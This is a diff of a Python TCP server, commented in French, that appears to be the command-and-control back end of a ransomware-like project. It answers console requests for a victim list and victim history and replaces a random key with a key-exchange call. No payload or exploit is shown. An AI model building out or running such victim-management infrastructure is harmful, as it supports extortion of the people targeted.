@@ -12,15 +12,12 @@ import binascii
 # --------------------------------------------
 import socket
 import threading
-from _thread import start_new_thread
-
 import configgetter as config
 import security
 import queue
 import utile.data as udata
 import message
 import pickle
-
 # --------------------------------------------
 # Classes & Functions
 # --------------------------------------------
@@ -102,18 +99,15 @@ class server_tcp(object):
         """
         Système de gestion des commandes envoyées par la console de contrôle
         """
-        conn = udata.connect_db()
         if msg == message.list_victim_req():
-            # On va interroger le serveur SQL depuis le serveur frontal pour des raisons
+            # On va interroger le serveur SQL depuis le serveur frontale pour des raisons
             # De sécurité...
             # On envoie la liste
-            list = udata.list_victims(conn)
-            conn.close()
-            return list
+            return udata.list_victim()
         elif "HIST_REQ" in msg:
             # On demande un ID en particulier pour une recherche d'historique
             # On envoie l'historique
-            return udata.history_req(conn, msg[-3:-2])
+            return udata.history_req(msg[-3:-2])
         elif msg == '3':
             # C'est à faire
             return "Todo3"
@@ -134,14 +128,7 @@ class server_tcp(object):
         # Sécurisé de manière différente (différents nonce, key, authtag)
         # chaques connexion pour éviter de pouvoir spoof sur une autre connexion
         # tcp avec des keys d'autres connexions...
-
-
-        sec_key = security.gen_key(16)
-        self.send_data(c, sec_key)
-
-
-        #c.send(bytes(str(binascii.hexlify(sec.showValues())), 'utf-8'))
-        # Todo: Mettre en place le cryptage
+        sec_key = security.diffie_hellmand_sendk(c)
         while True:
             data = self.receive_data(c)
             if data == b'' or data is None:
@@ -156,7 +143,7 @@ class server_tcp(object):
             rs = self.gestion_msg(c, clearMsg)
             r = security.crypt(rs, sec_key)
             payload = pickle.dumps(r)
-            # @Todo: Build header & send it before msg
+            # Build header & send it before msg
             # On l'envoie
             self.send_data(c, payload)
         # On ferme la connexion du client lors de la fin de connexion
